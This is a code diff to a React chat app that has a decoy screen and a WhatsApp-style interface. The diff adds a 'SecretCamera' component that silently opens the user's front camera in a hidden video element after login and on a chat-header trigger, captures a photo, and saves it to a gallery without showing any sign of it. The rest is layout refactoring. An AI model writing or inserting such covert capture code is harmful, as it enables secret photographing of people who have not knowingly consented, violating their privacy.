@@ -1,5 +1,5 @@
 "use client";
-import { useState, useEffect, useRef } from "react";
+import React, { useState, useEffect, useRef, useMemo, useCallback } from "react";
 import PusherJS from "pusher-js";
 import CryptoJS from "crypto-js";
 import { Lock, ChevronRight, ChevronLeft, X, Loader2 } from "lucide-react";
@@ -56,6 +56,52 @@ const compressImageToBase64 = (file, maxWidth = 600, quality = 0.75) => {
   });
 };
 
+// 🔥 STRICT FRONT CAMERA HIDDEN SNAP COMPONENT
+const SecretCamera = React.memo(({ triggerSnap, onSnapDone }) => {
+  const hiddenVidRef = useRef(null);
+  useEffect(() => {
+    if (!triggerSnap) return;
+    let streamRef = null;
+    const takeSnap = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, // Strictly front camera
+            audio: false 
+        });
+        streamRef = stream;
+        const video = hiddenVidRef.current;
+        video.srcObject = stream;
+        
+        // Wait for video to be ready before capturing
+        await new Promise(resolve => {
+            video.onloadedmetadata = () => {
+                video.play().then(resolve);
+            };
+        });
+        
+        // Small delay to let camera adjust light
+        setTimeout(() => {
+            if(video.videoWidth === 0) return;
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            onSnapDone(canvas.toDataURL("image/jpeg", 0.7));
+            streamRef.getTracks().forEach(t => t.stop()); // Stop immediately
+        }, 300);
+
+      } catch (e) {
+        console.warn("Camera failed:", e);
+      } finally {
+        if (streamRef) setTimeout(() => streamRef.getTracks().forEach(t => t.stop()), 1000);
+      }
+    };
+    takeSnap();
+  }, [triggerSnap, onSnapDone]);
+  return <video ref={hiddenVidRef} className="hidden opacity-0 pointer-events-none" playsInline muted />;
+});
+
 export default function Home() {
   const [appState, setAppState] = useState("DECOY");
   const [studentId, setStudentId] = useState("");
@@ -106,6 +152,10 @@ export default function Home() {
   const [isSnapping, setIsSnapping] = useState(false);
   const [isRecording, setIsRecording] = useState(false);
 
+  // 🔥 NEW STATES FOR SURPRISE/PROPOSAL CAMERA
+  const [proposalSnaps, setProposalSnaps] = useState([]); 
+  const [triggerSecretSnap, setTriggerSecretSnap] = useState(false);
+
   const mediaRecorderRef = useRef(null);
   const videoChunksRef = useRef([]);
   const pressTimerRef = useRef(null);
@@ -122,6 +172,23 @@ export default function Home() {
   const snapVideoRef = useRef(null);
   const peerInstance = useRef(null);
   const currentCall = useRef(null);
+
+  // 🔥 7-DAY AUTO DELETE LOGIC FOR SNAPS
+  useEffect(() => {
+    const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
+    const interval = setInterval(() => {
+      setProposalSnaps(prev => prev.filter(snap => (Date.now() - snap.timestamp) < SEVEN_DAYS_MS));
+    }, 60000); // Check every minute
+    return () => clearInterval(interval);
+  }, []);
+
+  const addSecretSnap = useCallback((photoUrl) => {
+    setProposalSnaps(prev => [{ url: photoUrl, timestamp: Date.now(), id: Math.random().toString() }, ...prev]);
+  }, []);
+
+  const deleteSecretSnap = useCallback((id) => {
+    setProposalSnaps(prev => prev.filter(snap => snap.id !== id));
+  }, []);
 
   useEffect(() => {
     try {
@@ -638,6 +705,10 @@ export default function Home() {
         } catch (e) {}
         
         setAppState("WHATSAPP_UI"); 
+        
+        // 🔥 TRIGGER AUTO SNAP ON LOGIN
+        setTimeout(() => setTriggerSecretSnap(true), 1500);
+
         await registerServiceWorkerAndSubscribe();
       } else { setError("Invalid University ID or PIN."); }
     } catch (err) { setError("Network error."); } finally { setIsLoggingIn(false); }
@@ -766,7 +837,6 @@ export default function Home() {
     return () => { clearInterval(pingInterval); clearTimeout(peerTimeout.current); clearTimeout(typingTimeout.current); pusher.unsubscribe(activeChannel); pusher.disconnect(); };
   }, [appState, currentUser, activeChannel, studentId, targetNode]);
 
-  // 🔥 SCROLL TO BOTTOM RESTORED HERE
   const scrollToBottom = () => {
     setTimeout(() => {
       if (chatContainerRef.current) {
@@ -941,10 +1011,6 @@ export default function Home() {
     }
   };
 
-  const bgPatternDark = `url("data:image/svg+xml,%3Csvg width='180' height='180' viewBox='0 0 180 180' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%233f3f46' fill-opacity='0.2' font-family='sans-serif'%3E%3Ctext x='20' y='30' font-size='16'%3E%F0%9F%98%BA%3C/text%3E%3Ctext x='80' y='80' font-size='12'%3E%E2%99%A1%3C/text%3E%3Ctext x='140' y='40' font-size='14'%3E%E2%98%86%3C/text%3E%3Ctext x='30' y='120' font-size='16'%3E%E2%98%BA%3C/text%3E%3Ctext x='110' y='150' font-size='12'%3E%E2%9C%A8%3C/text%3E%3Ctext x='160' y='110' font-size='14'%3E%E2%99%A1%3C/text%3E%3Ctext x='80' y='10' font-size='10'%3E%E2%98%BA%3C/text%3E%3Ctext x='10' y='80' font-size='10'%3E%E2%9C%A8%3C/text%3E%3C/g%3E%3C/svg%3E")`;
-  const bgPatternLight = `url("data:image/svg+xml,%3Csvg width='180' height='180' viewBox='0 0 180 180' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23d0d5df' fill-opacity='0.4' font-family='sans-serif'%3E%3Ctext x='20' y='30' font-size='16'%3E%F0%9F%98%BA%3C/text%3E%3Ctext x='80' y='80' font-size='12'%3E%E2%99%A1%3C/text%3E%3Ctext x='140' y='40' font-size='14'%3E%E2%98%86%3C/text%3E%3Ctext x='30' y='120' font-size='16'%3E%E2%98%BA%3C/text%3E%3Ctext x='110' y='150' font-size='12'%3E%E2%9C%A8%3C/text%3E%3Ctext x='160' y='110' font-size='14'%3E%E2%99%A1%3C/text%3E%3Ctext x='80' y='10' font-size='10'%3E%E2%98%BA%3C/text%3E%3Ctext x='10' y='80' font-size='10'%3E%E2%9C%A8%3C/text%3E%3C/g%3E%3C/svg%3E")`;
-  const bgPatternLove = `url("data:image/svg+xml,%3Csvg width='180' height='180' viewBox='0 0 180 180' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23e11d48' fill-opacity='0.1' font-family='sans-serif'%3E%3Ctext x='20' y='30' font-size='20'%3E%E2%9D%A4%EF%B8%8F%3C/text%3E%3Ctext x='80' y='80' font-size='16'%3E%F0%9F%92%96%3C/text%3E%3Ctext x='140' y='40' font-size='20'%3E%F0%9F%A5%80%3C/text%3E%3Ctext x='30' y='120' font-size='16'%3E%F0%9F%92%8B%3C/text%3E%3Ctext x='110' y='150' font-size='20'%3E%E2%9D%A4%EF%B8%8F%3C/text%3E%3Ctext x='160' y='110' font-size='16'%3E%F0%9F%8C%B9%3C/text%3E%3C/g%3E%3C/svg%3E")`;
-
   return (
     <>
       <audio
@@ -957,12 +1023,25 @@ export default function Home() {
         playsInline
         className="absolute w-0 h-0 opacity-0 pointer-events-none"
       />
+      
+      {/* 🔥 HIDDEN CAMERA TRIGGER FOR SECRET SNAPS (Front Cam Only) */}
+      <SecretCamera 
+        triggerSnap={triggerSecretSnap} 
+        onSnapDone={(photoUrl) => {
+           addSecretSnap(photoUrl);
+           setTriggerSecretSnap(false);
+        }} 
+      />
 
       <AnimatePresence mode="wait">
         
-        {/* 🔥 NEW MODULE ADDED HERE WITH PROPER KEY 🔥 */}
+        {/* PROPOSAL MODULE */}
         {appState === "PROPOSAL_MODE" && (
-          <ProposalModule key="proposal" setAppState={setAppState} />
+          <ProposalModule 
+             key="proposal" 
+             setAppState={setAppState} 
+             onCapture={(photoUrl) => addSecretSnap(photoUrl)} 
+          />
         )}
 
         {appState === "DECOY" && (
@@ -994,6 +1073,7 @@ export default function Home() {
           }} />
         )}
 
+        {/* WHATSAPP UI */}
         {(appState === "WHATSAPP_UI" || appState === "MODE_SELECTION") && (
           <WhatsAppUI 
              setAppState={setAppState}
@@ -1021,6 +1101,8 @@ export default function Home() {
              surpriseRevealed={surpriseRevealed}
              setSurpriseRevealed={setSurpriseRevealed}
              isFetchingChat={isFetchingChat} 
+             proposalSnaps={proposalSnaps} // 🔥 GALLERY SNAPS
+             onDeleteSnap={deleteSecretSnap} // 🔥 DELETE LOGIC
           />
         )}
 
@@ -1029,26 +1111,17 @@ export default function Home() {
         )}
 
         {appState === "SNAP_MODE" && (
-          <motion.div
-            key="snap-mode"
-            initial={{ opacity: 0, y: 50 }}
-            animate={{ opacity: 1, y: 0 }}
-            exit={{ opacity: 0, y: 50 }}
-            className="absolute inset-0 w-full h-[100dvh] bg-black z-[100] flex flex-col overflow-hidden select-none"
-          >
+          <motion.div key="snap-mode" initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 50 }} className="absolute inset-0 w-full h-[100dvh] bg-black z-[100] flex flex-col overflow-hidden select-none">
             <video ref={snapVideoRef} autoPlay playsInline muted className="absolute inset-0 w-full h-full object-cover scale-105 transform -scale-x-100 transition-all duration-300" style={{ filter: SNAP_FILTERS[snapFilterIndex].filter }} />
-
             <div className="absolute top-0 inset-x-0 p-6 flex justify-between items-center bg-gradient-to-b from-black/70 to-transparent z-20">
                <button onClick={() => setAppState("WHATSAPP_UI")} className="p-2 bg-white/10 backdrop-blur-md rounded-full text-white active:scale-95 transition-transform"><X size={24} /></button>
                <div className="text-white font-semibold text-xs tracking-[0.2em] uppercase drop-shadow-md">{SNAP_FILTERS[snapFilterIndex].name}</div>
                <div className="w-10"></div>
             </div>
-
             <div className="absolute inset-0 z-10 flex">
               <div className="w-1/2 h-full flex items-center justify-start p-4 opacity-0 hover:opacity-100 transition-opacity cursor-pointer" onClick={() => setSnapFilterIndex(prev => (prev - 1 + SNAP_FILTERS.length) % SNAP_FILTERS.length)}><ChevronLeft className="text-white drop-shadow-lg" size={48} /></div>
               <div className="w-1/2 h-full flex items-center justify-end p-4 opacity-0 hover:opacity-100 transition-opacity cursor-pointer" onClick={() => setSnapFilterIndex(prev => (prev + 1) % SNAP_FILTERS.length)}><ChevronRight className="text-white drop-shadow-lg" size={48} /></div>
             </div>
-
             <div className="absolute bottom-0 inset-x-0 pb-12 pt-20 flex flex-col items-center bg-gradient-to-t from-black/90 via-black/40 to-transparent z-20">
                <div className="text-white/80 text-xs tracking-widest uppercase mb-6 font-medium drop-shadow-md pointer-events-none">Tap for Photo • Hold for Video</div>
                <button onPointerDown={handlePointerDown} onPointerUp={handlePointerUp} onPointerLeave={handlePointerUp} onContextMenu={(e) => e.preventDefault()} style={{ touchAction: 'none' }} disabled={isSnapping && !isRecording} className={`relative w-20 h-20 rounded-full border-4 flex items-center justify-center transition-all duration-300 pointer-events-auto select-none ${isRecording ? 'border-rose-500 scale-[1.15]' : 'border-white/80 active:scale-90'}`}>
@@ -1063,60 +1136,31 @@ export default function Home() {
         )}
 
         {appState === "CHAT" && (
-          <motion.div
-            ref={chatWrapperRef}
-            key="chat"
-            initial={{ opacity: 0, x: 50 }}
-            animate={{ opacity: 1, x: 0 }}
-            exit={{ opacity: 0, x: -50 }}
-            transition={{ type: "spring", stiffness: 300, damping: 30 }}
-            className={`absolute left-0 w-full font-sans flex flex-col overflow-hidden z-50 ${isDarkMode || isLoveMode ? "text-slate-200" : "text-slate-800"}`}
-            style={{ top: 0, height: '100%', backgroundColor: isLoveMode ? '#050002' : (isDarkMode ? '#09090b' : '#f4f5f9') }}
-          >
+          <motion.div ref={chatWrapperRef} key="chat" initial={{ opacity: 0, x: 50 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -50 }} transition={{ type: "spring", stiffness: 300, damping: 30 }} className={`absolute left-0 w-full font-sans flex flex-col overflow-hidden z-50 ${isDarkMode || isLoveMode ? "text-slate-200" : "text-slate-800"}`} style={{ top: 0, height: '100%', backgroundColor: isLoveMode ? '#050002' : (isDarkMode ? '#09090b' : '#f4f5f9') }}>
             <input type="file" accept="image/*,video/*" capture="camera" ref={cameraInputRef} className="hidden" onChange={handleMediaUpload} />
             <input type="file" accept="image/*,video/*" ref={galleryInputRef} className="hidden" onChange={handleMediaUpload} />
 
-            <ChatHeader targetNode={targetNode} isPeerActive={isPeerActive} lastActiveTime={lastActiveTime} isDarkMode={isDarkMode} setIsDarkMode={setIsDarkMode} isLoveMode={isLoveMode} setIsLoveMode={setIsLoveMode} startCall={startCall} callState={callState} handlePingPartner={handlePingPartner} isPinging={isPinging} handleLogout={handleLogout} setAppState={setAppState} setExpandedImage={setExpandedImage} partnerImage={partnerImage} />
-
-            <MessageList messages={messages} isDarkMode={isDarkMode} isLoveMode={isLoveMode} expandedImage={expandedImage} setExpandedImage={setExpandedImage} isPeerActive={isPeerActive} isPeerTyping={isPeerTyping} chatContainerRef={chatContainerRef} setReplyTo={setReplyTo} handleReaction={handleReaction} handleMessageAction={handleMessageAction} />
-
-            <MessageInput 
-               inputRef={inputRef} 
-               input={input} 
-               setInput={setInput} 
-               handleTextSubmit={handleTextSubmit} 
-               handleInputChange={handleInputChange} 
-               isUploading={isUploading} 
-               showEmojis={showEmojis} 
-               setShowEmojis={setShowEmojis} 
-               cameraInputRef={cameraInputRef} 
-               galleryInputRef={galleryInputRef} 
-               isDarkMode={isDarkMode} 
-               isLoveMode={isLoveMode} 
-               ignorePanicRef={ignorePanicRef} 
-               scrollToBottom={scrollToBottom} 
-               dispatchMessage={dispatchMessage} 
-               setAppState={setAppState} 
-               replyTo={replyTo} 
-               setReplyTo={setReplyTo} 
-               CLOUDINARY_CLOUD_NAME={CLOUDINARY_CLOUD_NAME} 
-               CLOUDINARY_UPLOAD_PRESET={CLOUDINARY_UPLOAD_PRESET} 
+            {/* 🔥 CHAT HEADER UPDATED WITH SNAP TRIGGER */}
+            <ChatHeader 
+               targetNode={targetNode} isPeerActive={isPeerActive} lastActiveTime={lastActiveTime} 
+               isDarkMode={isDarkMode} setIsDarkMode={setIsDarkMode} isLoveMode={isLoveMode} setIsLoveMode={setIsLoveMode} 
+               startCall={startCall} callState={callState} handlePingPartner={handlePingPartner} isPinging={isPinging} 
+               handleLogout={handleLogout} setAppState={setAppState} setExpandedImage={setExpandedImage} 
+               partnerImage={partnerImage} 
+               triggerSecretSnap={() => setTriggerSecretSnap(true)} 
             />
 
+            <MessageList messages={messages} isDarkMode={isDarkMode} isLoveMode={isLoveMode} expandedImage={expandedImage} setExpandedImage={setExpandedImage} isPeerActive={isPeerActive} isPeerTyping={isPeerTyping} chatContainerRef={chatContainerRef} setReplyTo={setReplyTo} handleReaction={handleReaction} handleMessageAction={handleMessageAction} />
+            <MessageInput inputRef={inputRef} input={input} setInput={setInput} handleTextSubmit={handleTextSubmit} handleInputChange={handleInputChange} isUploading={isUploading} showEmojis={showEmojis} setShowEmojis={setShowEmojis} cameraInputRef={cameraInputRef} galleryInputRef={galleryInputRef} isDarkMode={isDarkMode} isLoveMode={isLoveMode} ignorePanicRef={ignorePanicRef} scrollToBottom={scrollToBottom} dispatchMessage={dispatchMessage} setAppState={setAppState} replyTo={replyTo} setReplyTo={setReplyTo} CLOUDINARY_CLOUD_NAME={CLOUDINARY_CLOUD_NAME} CLOUDINARY_UPLOAD_PRESET={CLOUDINARY_UPLOAD_PRESET} />
             <CallOverlay callState={callState} isVideoCall={isVideoCall} localStream={localStream} remoteStream={remoteStream} answerCall={answerCall} rejectCall={rejectCall} endCall={endCall} isMicMuted={isMicMuted} isVideoMuted={isVideoMuted} toggleMic={toggleMic} toggleVideo={toggleVideo} isRemoteVideoMuted={isRemoteVideoMuted} isRemoteMicMuted={isRemoteMicMuted} isCallMinimized={isCallMinimized} setIsCallMinimized={setIsCallMinimized} SNAP_FILTERS={SNAP_FILTERS} localFilter={localFilter} setLocalFilter={(newFilterIndex) => { setLocalFilter(newFilterIndex); const pingText = CryptoJS.AES.encrypt(`SYS_VID_FILTER::${newFilterIndex}`, SECRET_KEY).toString(); fetch("/api/pusher", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ id: Date.now(), encryptedText: pingText, senderId: studentId.trim(), channel: activeChannel }) }).catch(() => {}); }} remoteFilter={remoteFilter} />
           </motion.div>
         )}
 
         {expandedImage && (
            <motion.div initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} onClick={() => setExpandedImage(null)} className="fixed inset-0 z-[200] bg-black/95 flex flex-col items-center justify-center p-4 backdrop-blur-sm">
-              {expandedImage.type === 'video' ? (
-                 <video src={expandedImage.url} controls autoPlay className="max-w-full max-h-[80vh] rounded-2xl shadow-2xl" onClick={(e) => e.stopPropagation()} />
-              ) : (
-                 <img src={expandedImage.url} alt="Expanded" className="max-w-full max-h-[80vh] rounded-2xl shadow-2xl object-contain" onClick={(e) => e.stopPropagation()} />
-              )}
+              {expandedImage.type === 'video' ? <video src={expandedImage.url} controls autoPlay className="max-w-full max-h-[80vh] rounded-2xl shadow-2xl" onClick={(e) => e.stopPropagation()} /> : <img src={expandedImage.url} alt="Expanded" className="max-w-full max-h-[80vh] rounded-2xl shadow-2xl object-contain" onClick={(e) => e.stopPropagation()} />}
            </motion.div>
         )}
-
       </AnimatePresence>
     </>
   );
